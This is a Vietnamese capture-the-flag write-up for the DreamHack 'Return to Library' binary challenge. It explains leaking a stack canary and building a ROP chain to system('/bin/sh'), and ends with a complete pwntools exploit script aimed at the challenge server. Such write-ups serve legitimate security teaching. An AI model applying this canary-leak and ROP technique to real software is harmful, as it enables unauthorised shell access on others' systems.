# Return-to-Library---Write-up-----DreamHack
Hướng dẫn cách giải bài Return to Library cho anh em mới chơi pwnable.

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 9/12/2025

## 1. Mục tiêu cần đạt
1. Đọc hiểu code
2. Leak được canary
3. Tìm được full địa chỉ của các hàm quan trọng
4. Băm bài này

## 2. Cách thực thi
Đầu tiên là các bạn cần leak được Canary đã. Khi các bạn gõ `gdb rtl` và `disas main` các bạn hãy sẽ thấy là Canary nằm ở `rbp-0x8`

<img width="721" height="55" alt="image" src="https://github.com/user-attachments/assets/34e4f0b3-9b59-4140-8632-6a2fe299de3a" />

Còn `buf` nằm ở `rbp-0x40`

<img width="692" height="122" alt="image" src="https://github.com/user-attachments/assets/25403a69-1391-4c05-8687-56b13590bc16" />

Nếu theo như code bên C `read(0, buf, 0x100);` thì `buf` sẽ được `lea` vào rax. Sau khi có địa chỉ `buf` + Canary thì ta lấy 2 cái trừ nhau là ra offset. Vậy offset là 0x38 tương đương 56 byte. Nhưng vì Canary bắt đầu bằng Null mà printf gặp Null là dừng nên ta hãy đè nó để có thể in hết ra Canary.

```Python
payload = b'A' * 57
p.sendafter(b'Buf: ', payload)
p.recvuntil(payload)

canary = p.recv(7)
canary = u64(b'\x00' + canary)

log.success(f'Canary found : {hex(canary)}')
```

Sau khi có Canary thì giờ chúng ta cần các địa chỉ sau để ROP và chạy : `/bin/sh`, `system_plt`, `ret` ( Stack Alignment ), `pop_rdi` ( để đặt `/bin/sh` làm tham số 1 ). Giờ thì hãy mổ xẻ tìm từng cái nào.

Đầu tiên dễ nhất là `ret` và `pop_rdi`, các bạn cứ gõ lệnh `ROPgadget --binary | grep '...'` để tìm

Đây là `ret`

<img width="293" height="29" alt="image" src="https://github.com/user-attachments/assets/0b7da98b-d963-4feb-a416-7968d6deeafc" />

Đây là `pop_rdi`

<img width="412" height="25" alt="image" src="https://github.com/user-attachments/assets/598323b6-6dcc-4d60-87d9-5b468b5fd464" />

Tiếp theo là `/bin/sh`, vì chương trình nó có sẵn 1 biến là `const char* binsh = "/bin/sh";` nên ta hãy mở gdb lên và start. Sau đó gõ lệnh `search /bin/sh` là ra.

<img width="781" height="127" alt="image" src="https://github.com/user-attachments/assets/c74616bf-2bf0-47c7-bc87-05927fa76ec8" />

Cuối cùng là `system_plt`, vì chương trình đã chạy lệnh này rồi `system("echo 'system@plt'");` nên nó sẽ nằm ở vùng .plt. Chúng ta chỉ cần tìm nó bằng lệnh này thôi `objdump -d rtl | grep system`.

<img width="1197" height="71" alt="image" src="https://github.com/user-attachments/assets/27db699a-8a5c-4238-afcb-a94e45234112" />

Vậy là đã có đủ hết tất cả rồi bắt đầu băm thôi nào.

```Python
ret = 0x400596
pop_rdi = 0x400853
system_plt = 0x4005d0
bin_sh_add = 0x400874

payload = b'A' * 56
payload += p64(canary)
payload += b'B' * 8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh_add)
payload += p64(system_plt)

p.sendafter(b'Buf: ', payload)
```

Thế là xong, chúng ta đã thành công chiếm quyền điều khiển. Giờ hãy cho nổ tung shellcode này thôi.

<img width="224" height="225" alt="image" src="https://github.com/user-attachments/assets/b99f37ae-19d0-4401-97d6-eca40d4f68d3" />

Nhớ cho mình 1 star để có thêm động lực viết thêm write up nha 🐧.


```Python
from pwn import *

# p = process('./rtl')
p = remote('host8.dreamhack.games', 11568)

ret = 0x400596
pop_rdi = 0x400853
system_plt = 0x4005d0
bin_sh_add = 0x400874

payload = b'A' * 57
p.sendafter(b'Buf: ', payload)
p.recvuntil(payload)

canary = p.recv(7)
canary = u64(b'\x00' + canary)

log.success(f'Canary found : {hex(canary)}')

payload = b'A' * 56
payload += p64(canary)
payload += b'B' * 8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh_add)
payload += p64(system_plt)

p.sendafter(b'Buf: ', payload)

p.interactive()
```
